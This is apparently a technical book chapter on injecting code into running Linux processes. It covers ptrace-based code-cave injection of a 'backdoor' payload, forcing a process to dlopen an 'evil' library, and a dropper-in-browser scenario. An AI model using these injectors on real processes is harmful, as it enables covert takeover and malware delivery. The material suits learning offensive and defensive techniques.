## Non-Destructive Code Injection

We have already seen the basics of non-destructive code injection in chapter 1. We store the original values in the area of memory we’re going to write, do our stuff, and then restore them. However, there are a few extra alternatives that can be used to inject code in a way the original program doesn't break. For doing this, we need some extra memory, either to store the old values and restore them afterwards (as I just mentioned) or to write our injected code in a new area so we don't overwrite the program. There is a third option that consists of finding unused areas in the code and reusing them. This last one is maybe the least invasive and easiest to implement alternative because most programs out there have some unused areas in them, known as code caves, which will perfectly suit our purposes.

In the examples in this section, we’ll use the a priori knowledge that our simple game program uses one single page for code, so we’ll write our scan loop to work in a single page. In the general case, we’d take this information from the ELF file or the process memory map, but you already know how to do that, so I’ll just pass that information in as a parameter, as we did in the previous section, instead of bloating the source code. In this case, we just need the start of the `.text` segment to look for a code cave in the target process.

> **BOX: Code Caves**
>
> When a program is converted into a binary, the linker leaves blank spaces between segments, mostly for keeping a nice page alignment for each of those segments. This results in small spaces (less than a page, which for Linux is 4096 bytes) unused in the binary file as well as in the memory during execution. You can open any binary in an hex editor or pass it through `xxd` and you’ll see multiple regions filled with zeros. These spaces can be used without affecting the behaviour of the main program because they are not used by it.
>
> Code caves are one of the easiest ways to add code into a binary because it doesn’t need further operations like allocating memory or updating ELF structures, in case you are injecting the code directly in the binary file. On the other hand, size is always less than 4096 bytes, and in some cases, it may be just a few bytes—it all depends on each specific program.
>
> If you know your target and know it has code caves, then this is one of the easiest ways to approach the problem. Otherwise, if you don’t have any insights on the program you are injecting code, it is better to use other techniques, which we’ll discuss later.

Before continuing, let me bring to your attention a subtle point regarding destructive code injection. Even when these techniques destroy the program in memory in an unrecoverable way, they can still be applied without disturbing the target program execution if you choose carefully the parts of the program to overwrite. In other words, once the program is running, there are code sections which won’t be executed again, normally initialization code run at the very beginning, which includes the libc startup code in `_start` that eventually calls `main`. `_start` is a small function, so it can just store a few instructions, but it’s something that can be overwritten without breaking the current program. Other alternatives are code intended to manage errors which are unlikely to happen or clean-up code when the program stops. This last case will depend on what the program does when it terminates. Many times it frees memory and closes files, which the OS will do anyway, so even when that code is not executed, there won’t be any noticeable effect of the code injection, in most cases.

Another option is at the beginning of execution. Many programs start with code to parse the command-line arguments that can be pretty long. Once the command-line arguments are parsed, that code is not executed anymore (becomes dead code), and any modification of it won’t have an impact on the process.

Using these already used code blocks are good alternatives to code caves or a way to get some extra space if the cave is too small. Also, they illustrate the gray areas in all this topics. There is never black and white, or destructive and non-destructive. This last example shows that we can destructively inject code in a running program without really breaking the program if done carefully. In the rest of the section, I'll be using code caves to inject code into the process. Just keep in mind that you can modify any of these programs to use the areas we’ve just introduced with the same result.

Now let’s continue with the code to locate code caves. As I said, I’m assuming that argument 1 is the PID and argument 2 is the base address of the code segment. I’m also assuming the segment is only 1 page long:

```C
  pid_t                    pid = atoi(argv[1]);
  uint64_t                 addr = atol(argv[2]);
  struct iovec             local1[1], remote[1];
  uint64_t                 v, pagesize = sysconf (_SC_PAGESIZE);
  
  local1[0].iov_base = malloc (pagesize);
  local1[0].iov_len  = pagesize;
  remote[0].iov_base = (void*)addr;
  remote[0].iov_len  = pagesize;
  process_vm_readv(pid, local1,1, remote,1,0);
  
  int i, i1 = 0, cnt = 0;
  int target_size = backdoor_bin_len;
  uint8_t *p = (uint8_t*) local1[0].iov_base;
  for (i = 0; i < pagesize; i++) {
    if (!p[i]) cnt++;
    else {
      if (cnt >= target_size) break;
      cnt = 0;
      i1 = i + 1;
    }
  }
  if (cnt < backdoor_bin_len) {
    puts ("Code cave not found!");
    exit (EXIT_FAILURE);
  } addr += i1;
  printf ("Injecting code in code cave at %p\n", addr);
```

The code just reads the target memory, text segment, in one go using `process_vm_readv`. Then it looks for any sequence of zeros big enough to contain the payload that will be injected (our backdoor). From this point on, the rest of the program is the same, but instead of copying the payload in a specific part of `main` or over an existing function, we’re now copying it in an unused area, leaving the original program untouched.

```C
  if ((v = ptrace (PTRACE_PEEKTEXT, pid, regs.rip, 0)) < 0)  DIE ("PTRACE_PEEKTEXT:");
  if (ptrace (PTRACE_POKETEXT, pid, regs.rip, 0x000000000000050f) < 0)  DIE ("PTRACE_POKETEXT:");
  inject_syscall (pid, &regs, 10,
                  addr & ~(pagesize - 1), pagesize, PROT_WRITE | PROT_READ | PROT_EXEC,0);
  // ----------------------------
  // Use code cave
  local1[0].iov_base = backdoor_bin;
  local1[0].iov_len  = backdoor_bin_len;

  remote[0].iov_base = (void*) addr; // Copy just after syscall
  remote[0].iov_len  = backdoor_bin_len;
  process_vm_writev (pid, local1, 1, remote, 1, 0);

  if (ptrace (PTRACE_POKETEXT, pid, old_regs.rip, v) < 0)  DIE ("PTRACE_POKETEXT:");
  old_regs.rip = addr;
  if (ptrace (PTRACE_SETREGS, pid, 0, &old_regs) < 0)  DIE ("PTRACE_SETREGS1:");

  // Let the tracee continue
  if (ptrace (PTRACE_DETACH,   pid,        0,         0) < 0) DIE ("PTRACE_DETACH:");
  return 0;
}
```

> **TECHNIQUE**: Destructive code injection into code caves
>
> _Code injection_
>
> Use `ptrace` and `process_vm_XXv` system calls to inject your code in existing code caves, keeping original code unmodified. This technique requires setting `RIP` to the code cave.

We insert the `syscall` instruction to change segment permissions so we can write using `process_vm_writev` to copy over our payload into the code cave and finally restore registers and the instruction overwritten by our inject `syscall` so everything gets back to the same state it had before, except for the `rip` register, which now points to the injected payload, where we want the program execution to continue.

Note that this injection technique, as implemented here, is also destructive, in the sense that the target program stops working; however, this is due to the nature of the payload that we are injecting. You can change it for our `Hello, world!` payload, adding a breakpoint at the end instead of an `exit` syscall. Then issue a `PTRACE_CONT` to run the payload and `wait(&status)` for the payload to hit the breakpoint. Or alternatively, we can modify the process stack to return to the main program, and end our payload with `ret`. Those are two easy ways to convert this destructive code injection into non-destructive code injection.

Using a `ret` is more convenient, as once we’ve set everything up, we can just detach and finish our injection program, and the injected code will be eventually executed and return to the `main` program, instead of waiting for the payload to finish, get control back, and restore the original `rip` value. The change to the previous code to use this is shown below.

Remember that your shellcode has to return with `ret` (opcode `0xc3`), so you may have to produce a new one or patch the hex dump you are using.

```C
__--snip--__
  // Setup stack for the child to return to the main program
  if (ptrace (PTRACE_POKETEXT, pid, old_regs.rsp - 8, old_regs.rip) < 0)  DIE ("PTRACE_POKETEXT:");
  old_regs.rsp -= 8;
  old_regs.rip = addr;
  if (ptrace (PTRACE_SETREGS, pid, 0, &old_regs) < 0)  DIE ("PTRACE_SETREGS1:");
  // Let the tracee continue
  if (ptrace (PTRACE_DETACH,   pid,        0,         0) < 0) DIE ("PTRACE_DETACH:");
  return 0;
}
```

> **TECHNIQUE**: Non-Destructive code injection into code caves
>
> _Code injection_
>
> Use `ptrace` and `process_vm_XXv` system calls to inject your code in existing code caves, keeping original code unmodified. Add a `ret` instruction to the shell code and push the return address in the stack. The payload will run normally, and when finished, the target program will continue execution normally. This technique requires writing `RIP` and injecting a value in the stack.

This last scenario may cover, for instance, the execution of a dropper from within a program like an Internet browser for which a network connection is not suspicious. Firing this code will block the browser for a short period of time while the malware is downloaded by the dropper and potentially executed. After that, the browser continues as usual. We'll refine this technique in future chapters after introducing some new system calls.

### Code injection with `dlopen`

Another alternative for injecting code into a running process is to load a library and run a function from it; however, this technique can only be used on dynamic binaries. Well, technically, a library is just an ELF file that we can load manually and therefore inject it into a static binary. However, in that case (injecting into static binaries), the advantage of using a regular shared library just vanishes. So, in this section, we’ll see how to inject a shared library into a running dynamically linked program.

Let’s start writing a simple test program. This program actually uses `dlopen` to implement a kind of plug-in system. I chose this one because it already shows in C what we’ll be actually doing for injecting our shared library.


```C
#include <stdio.h>
#include <dlfcn.h>

int main (int argc, char *argv[]) { 
  void *h = dlopen ("./libtest.so", RTLD_NOW);
  if (h == NULL) {
    fprintf (stderr, "Error: %s\n", dlerror());
    return -1;
  }
  void (*f)() = dlsym (h, "run");
  while (1) {
	sleep (1);
	f();
  }
  dlclose (h);
}
```

This program just opens a library named `libtest.so` using `dlopen`. Then it looks for the function named `run` and executes it every second so we get it running to do our injection thingy. The `libtest.so` library code looks like this:

```C
#include <stdio.h>

void run () {
  puts ("Running the Test plug-in");
}
```

You can compile and run this with the following commands:

    $ make dlopen1
	$ gcc -shared -fpic -o libtest.so libtest.c
	$ ./dlopen1
	Running the Test plug-in

But we still need one more component for running our scenario. Let’s create an evil library.

> **`dlopen` and `__libc_dlopen_mode`**

> In the past, `dlopen`, `dlsym`, `dlclose`, etc. were provided by a library named `libdl.so` _Dynamic Linking/Loading_. At that time, if the library was not included, the `dlopen` function was just not there even for dynamically linked programs. However, the libc provided its own implementation of `dlopen` through an internal function known as `__libc_dlopen_mode`. As that function was provided by LibC, it was always available even if `libdl.so` wasn't linked in the program, and you'll see many tutorials using this function to load shared libraries.

> As per GNU C library 2.34, the `libdl.so` (as well as `libpthread.so`, and others) was included in the main library and it's no longer needed for programs using `dlXXX` functions. However, in case you land in a very old system, remember that libC had a `__libc_dlopen_mode` function that does the same that `dlopen`.

To keep the code smaller we’ll add a constructor to our library. In the realm of shared libraries a constructor is a function that gets executed the first time the library is loaded. This way we can get our code executed just using `dlopen` instead of requiring an extra call to `dlsym`. In any case, calling `dlsym` is technically the same than calling `dlopen`, in case you want to try.

So this is how `libevil.so` source code will look like:

```C
#include <stdio.h>
__attribute__((constructor))
void my_init () {
    puts ("Init Evil code1");
    fflush (stdout);
}

void run () {
  puts ("Running Evil code");
}
```

I kept the `run` function in case you want to experiment with `dlsym`. You already know how to do that from chapter 1. We’ll see alternative ways to do it later, but for now, our good old friend `ptrace` will do the work just fine.

Then we need to find the address of `dlopen` and `dlsym`. The problem here is ASLR. LibC will be loaded in different addresses every time the target program runs. That makes the addresses of the functions we want different on each execution. However, what doesn’t change is the offset of the function position with respect to the libC base address.

> **Lib C Versions and exploit development**

> As we’ve just said, even when the libC library is loaded at a random address at run-time, the offset to any function on it is fixed. However, such an offset changes with each version of libC. In other words, in order to know the offset to the function you are interested on, you need to know the version of libC your target program was linked against. That makes perfect sense. On each version of LibC new code is added and removed in different parts of the library. That has an impact on the offset/address where each function ends up in the library. So offset is constant but only for a given version of LibC. In this case we are compiling our injection program using the same library as the target so we can just use the offset.
>
> On exploit development and in many CTF when you have to use techniques like return to libC, the version of libC is important in order to figure out the address of the libC function you need.

We can easily get the libC base address from the process memory map which, for our test program will look like this:

```
$ cat /proc/3539107/maps
55a7e239e000-55a7e239f000 r--p 00000000 fd:01 49691047                   /opt/code/process_vm/dlopen1
55a7e239f000-55a7e23a0000 r-xp 00001000 fd:01 49691047                   /opt/code/process_vm/dlopen1
55a7e23a0000-55a7e23a1000 r--p 00002000 fd:01 49691047                   /opt/code/process_vm/dlopen1
55a7e23a1000-55a7e23a2000 r--p 00002000 fd:01 49691047                   /opt/code/process_vm/dlopen1
55a7e23a2000-55a7e23a3000 rw-p 00003000 fd:01 49691047                   /opt/code/process_vm/dlopen1
55a805a85000-55a805aa6000 rw-p 00000000 00:00 0                          [heap]
7fa47b8f8000-7fa47b8fb000 rw-p 00000000 00:00 0
7fa47b8fb000-7fa47b923000 r--p 00000000 fd:01 50081991                   /usr/lib/x86_64-linux-gnu/libc.so.6
7fa47b923000-7fa47ba86000 r-xp 00028000 fd:01 50081991                   /usr/lib/x86_64-linux-gnu/libc.so.6
7fa47ba86000-7fa47badc000 r--p 0018b000 fd:01 50081991                   /usr/lib/x86_64-linux-gnu/libc.so.6
7fa47badc000-7fa47bae0000 r--p 001e0000 fd:01 50081991                   /usr/lib/x86_64-linux-gnu/libc.so.6
7fa47bae0000-7fa47bae2000 rw-p 001e4000 fd:01 50081991                   /usr/lib/x86_64-linux-gnu/libc.so.6
7fa47bae2000-7fa47baef000 rw-p 00000000 00:00 0
7fa47bb06000-7fa47bb07000 r--p 00000000 fd:01 49691051                   /opt/code/process_vm/libtest.so
7fa47bb07000-7fa47bb08000 r-xp 00001000 fd:01 49691051                   /opt/code/process_vm/libtest.so
7fa47bb08000-7fa47bb09000 r--p 00002000 fd:01 49691051                   /opt/code/process_vm/libtest.so
__--snip--__
```

The value we’re interested on is the first mapped block for `libc.so.6`. In this case `0x7fa47b8fb000`. The offset to the function can be extracted checking the symbols in that specific libC version, which for my system will be something like:

    $ nm -D  /usr/lib/x86_64-linux-gnu/libc.so.6 | egrep "dlopen|dlsym"
    000000000008efc0 T dlopen@GLIBC_2.2.5
    000000000008efc0 T dlopen@@GLIBC_2.34
    000000000008f070 T dlsym@@GLIBC_2.34
    000000000008f070 T dlsym@GLIBC_2.2.5

The `-D` will list the dynamic symbols, which are the ones we’re really interested on. Alternatively, you can just compile a program with that library and print the address of the function you’re interested on, or use `readelf -s` to list all symbols in the library. Subtract your base address for your process, and that will be your offset. The specific solution will depend on what’s available to you at any time.

Let’s check out if our offset are correct:

    $ gdb --pid 3539107
    __--snip--__
    (gdb) p dlopen
    $1 = {<text variable, no debug info>} 0x7fa47b989fc0 <dlopen>
    (gdb) p dlopen - 0x7fa47b8fb000
    $2 = (<text variable, no debug info> *) 0x8efc0
    (gdb)

Perfect. Now, we can easily get the memory addresses for `dlopen` and `dlsym`. We just need to do the calls.

#### Loading and running shared libraries

Let’s write the code to inject our evil library into our test program. Let’s look at the code in pieces as we usually do. First the headers and main variables. This is the usual stuff so no surprises here.

```C
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/uio.h>
#include <sys/mman.h>

#define DIE(s) {perror(s); exit(1);}

int main (int argc, char *argv[]) {
  struct user_regs_struct  regs;
  struct user_regs_struct  old_regs;
  int                      status;
  pid_t                    pid = atoi(argv[1]);
  uint64_t                 ra, addr = atol(argv[2]), maddr= atol (argv[3]);
  char                     *msg = "./libevil.so";
  ssize_t                  len = strlen(msg);
  struct iovec             local1[2], remote[2];
```

You can see that we expect three parameters from the command-line. First, is the PID of the process we want to manipulate. Then we pass in the address of `dlopen` and then a pointer to the data section that we can use to write our data. I decided to pass these parameters from the command-line in order to keep the listings shorter, but you can easily get these addresses from the process memory map, which you would process anyways if you plan to calculate the `dlopen` address within the program.

For calling `dlopen` we need to provide the library path and for that reason we need to write it somewhere in memory.

> **Reusing Existing Strings**
>
> Alternatively to write the name of the library to load, we can rename our library against any string available in the addressing space of the process. Note that a library can have any name, the `libNAME.so` is just a convention and `GNU`, for instance, is a perfectly fine library name. However note that you shall be able to copy the file into a folder that is in the library searching path of the target process, otherwise we need to provide a path not just a filename. In other words, if we pass `GNU` to `dlopen` will look for a library named `GNU` in all paths in the library search path (whatever `LD_LIBRARY_PATH` or `/etc/ld.so.conf` says). Otherwise, if we want to load the `GNU` library in a folder not in the search path, we’ve to pass `./GNU` (for the same folder than the binary) or a full path like `/home/user/GNU`, for example.

For the test program we’re using there will be enough room just after the `.data` section as the kernel will allocate a full page for it and we just need a few bytes. In next chapter we’ll see how to allocate our own memory in case we cannot find a suitable area manually. Also note that, the stack is fine to execute system calls, but cannot be used to call regular functions. Once we `call` into the function, it will start allocating its own local variables and overwrite whatever we put in there. You can put your data far away in the stack (beyond the function local variables), but in this example I will use some of the empty space in the data segment, which a safer and more universal solution. You may be thinking, let’s add the data in the stack and update the `RSP` register, that will work but in that case we’d have to inject our own epilogue to restore `RSP` otherwise the stack will be completely corrupted.

Said that, let's take a look to the next fragment of code:

```C
  if (ptrace (PTRACE_SEIZE,pid,0,0) < 0) DIE("PTRACE_SEIZE:");
  if (ptrace (PTRACE_INTERRUPT,pid,0,0) < 0) DIE("PTRACE_INTERRUPT:");
  wait (&status);
  if (ptrace (PTRACE_SYSCALL,pid,0,0) < 0)  DIE ("PTRACE_SYSCALL:");
  wait (&status);
  if (ptrace (PTRACE_GETREGS,pid,0,&regs) < 0)  DIE ("PTRACE_GETREGS:");
  printf ("RAX: %lld | RAX_ORIG: %lld\n", regs.rax, regs.orig_rax);

  printf ("Stopped after system call...");
  getchar ();
```

This is a slight modification of the standard attaching code we’ve been using in Chapter 1. The last two `printf` are not really needed and are there just to show you that we’ve stopped before entering a syscall. Well, you’ll see from the `rax` register if we’re at the enter or exit, but for our test program which is waiting in a syscall, it will likely be the entering most of the time. In this case (before entering the syscall) you’ll see that `rax` value will be `-38` or `ENOSYS`. If you get stopped leaving a syscall, `rax` will contain the return value, usually 0 or an error different of `ENOSYS` (unless you call a system call that doesn't exist) and `orig_rax` will contain the system call number, the value of `rax` before executing the `syscall` instruction.

You may be wondering why we have to do this. That is actually a great question that took me quite sometime to answer. Now that I know why this happens, the explanation will look pretty obvious, but getting to this at first was not trivial.

If you remove the `PTRACE_SYSCALL` in the code above, and you’re using a program like our example in which, most of the times we try to attach it’ll be waiting on a system call (`read` in our example), the `rax` value you will see many times is `-516` that corresponds to:

```C
linux_src/include/linux/errno.h
#define ERESTART_RESTARTBLOCK 516 /* restart by calling sys_restart_syscall */
```

Which basically means that the syscall was interrupted and it will be restarted by calling the `sys_restart` system call. As we interrupted the process while in a system call, the `arch_do_signal_or_restart` function in `arch/ARCH/kernel/signal.c` eventually gets executed as part of this syscall restarting process. The code for this function looks like this:

```C
void arch_do_signal_or_restart(struct pt_regs *regs)
{
        struct ksignal ksig;

        if (get_signal(&ksig)) {
                /* Whee! Actually deliver the signal.  */
                handle_signal(&ksig, regs);
                return;
        }

        /* Did we come from a system call? */
        if (syscall_get_nr(current, regs) != -1) {
                /* Restart the system call - no handlers present */
                switch (syscall_get_error(current, regs)) {
                case -ERESTARTNOHAND:
                case -ERESTARTSYS:
                case -ERESTARTNOINTR:
                        regs->ax = regs->orig_ax;
                        regs->ip -= 2;
                        break;

                case -ERESTART_RESTARTBLOCK:
                        regs->ax = get_nr_restart_syscall(regs);
                        regs->ip -= 2;
                        break;
                }
        }
...
```
Which basically says that for errors involving restarting a system call, the `RIP` is adjusted by 2 bytes. This is for `x86` for which the `syscall` instruction is 2 bytes long, and subtracting 2 from `RIP` will make it point to the `syscall` instruction that was interrupted, forcing its re-execution. Note that this number for other architectures may be different. For example, ARM64 will adjust by 2 or 4 bytes depending on the type of code is running (Thumb or ARM state), RISC-V and MIPS will adjust by 4 bytes and so on. Check the kernel’s `arch/YOUR_ARCH_HERE/kernel/signal.c` file to find out the details.

So, summing up. If you just stop the process using `PTRACE_ATTACH` or `PTRACE_INTERRUPT`, you will likely interrupt a system call most of the time (programs are usually sleeping on system calls most of the time) and when you restart the execution, the kernel will try to restart the system call that was interrupted by making `rip = rip - 2`. That is fine if we just continue execution, but in our use case we’re injecting code and modifying `rip` to point somewhere else. In that case, we have to account for these 2 bytes adjust the kernel will do to `rip`.

Therefore, we can check the registers to see if we’ve got control by interrupting a system call and tune `rip` to compensate the kernel adjustment or we can use `PTRACE_SYSCALL` and force the process to stop before or after the actual system call, and just set `rip` to the value of the address we want the program to continue running. I’m using this last option in this program as it feels like the right solution.

After this short digression, let’s get back to our program and copy the data we need over. As we are simulating a regular function call we need to write two pieces of data in the target process:

* The return address
* Any additional data we need to pass as parameter, which in this case is the name of the library we want to load.

We can do this with just a single system call. This is what `process_vm_writev` is good for.

<!--- CHECK: We can likely do local1[0].iov_base = &regs.rip CHECK --->
```C
  ra = regs.rip;
  local1[0].iov_base = &ra;
  local1[0].iov_len  = sizeof(uint64_t);

  local1[1].iov_base = msg;
  local1[1].iov_len  = len;

  // Align to 16 bytes
  regs.rsp = (regs.rsp - sizeof(uint64_t)) & (~0xf);
  
  // Copy return address in stack and string in data segment
  remote[0].iov_base = (void*) regs.rsp - sizeof(uint64_t);
  remote[0].iov_len  = sizeof (uint64_t);
  
  remote[1].iov_base = (void*) maddr;
  remote[1].iov_len  = len;

  process_vm_writev (pid, local1, 2, remote, 2 ,0);
```

We are using two sets of `iovec` structs. One to write the return address (the current `rip` value) in the top of the stack, and the other to write our library name into the `data` segment we had identified before. Then one single call to `process_vm_writev` and we’ll write the two datasets in the two different memory blocks. That's cool.

Note that we'd aligned the stack pointer to 16 bytes to store the return address as per the System V ABI (check it out if you are curious).

Now that all the data is setup, we just set the registers to point to that data and redirect `rip` to the `dlopen` function.

```C
  regs.rsp = regs.rsp - sizeof(uint64_t);
  regs.rip = addr;      // dlopen pointer passed by command-line
  regs.rdi = maddr;     // rdi = "./libevil.so"
  regs.rsi = 2;         // RTLD_NOW
  regs.rip = addr;
  
  if (ptrace (PTRACE_SETREGS,pid,0,&regs) < 0)  DIE ("PTRACE_SETREGS:");
  puts ("Press any key to continue...\n");
  getchar ();
  if (ptrace (PTRACE_DETACH,pid,0,0) < 0) DIE ("PTRACE_DETACH:");
  return 0;	    
```

> **TECHNIQUE**: Non-Destructive code injection with `dlopen`
>
> _Code injection_
>
> Use `ptrace` and `process_vm_XXv` system calls to call `dlopen` on dynamic binaries and load a shared object. Add your code in the library constructor to get it executed on library load. Make sure to stop your process before or after a system call

During debugging this section, it was pretty useful to set the `LD_DEBUG=libs` environmental variable to check if the library was actually loaded. When setting this variable you will see something like this:


    $ LD_DEBUG=libs ./dlopen1
       1513158:	find library=libc.so.6 [0]; searching
       1513158:	 search cache=/etc/ld.so.cache
       1513158:	  trying file=/lib/x86_64-linux-gnu/libc.so.6
       1513158:
       1513158:
       1513158:	calling init: /lib64/ld-linux-x86-64.so.2
       1513158:
       1513158:
       1513158:	calling init: /lib/x86_64-linux-gnu/libc.so.6
       1513158:
       1513158:
       1513158:	initialize program: ./dlopen1
       1513158:
       1513158:
       1513158:	transferring control: ./dlopen1
       1513158:
    PID: 1513158
       1513158:
       1513158:	calling init: ./libtest.so
       1513158:
    Running test plug-in
    Running test plug-in

Note that with this flag we don’t need to print the PID in the program. You can also set `LD_DEBUG=all` and get much more debug information.

Once we have the target program running we need the pointer to `dlopen`. You can get it using any of the options discussed before. In this case I just use `gdb` which, for this specific execution, shows me:

    $ gdb --pid 1513158
    __--snip--__
    (gdb) p dlopen
    $1 = {<text variable, no debug info>} 0x7ff923bc7fc0 <dlopen>
    (gdb) info file
    __--snip--__
           0x0000560b7834d038 - 0x0000560b7834d048 is .data
		   0x0000560b7834d060 - 0x0000560b7834d070 is .bss
    __--snip--__
    (ggb) q

With all this data, we are good to execute our injector with a command line like this:

    $ ./dlopen_inject2 1513158  $((0x7ff923bc7fc0)) $((0x0000560b7834d000 + 256))

Note that we’re just writing our string at offset `256` of the `data` segment which is somewhere beyond the `.bss` section of the process. There are many other places you could use, this is just a possibility. The command above will make our test program show the following message:

    __--snip--__
    Running test plug-in
       1513158:
       1513158:        calling init: ./libevil.so
       1513158:
    Init Evil code1
    Running test plug-in
    __--snip--__

As you can see the whole process is pretty straightforward, however there are a few complications that, in case you aren’t aware of, may make you waste some time. I’m talking from experience :).
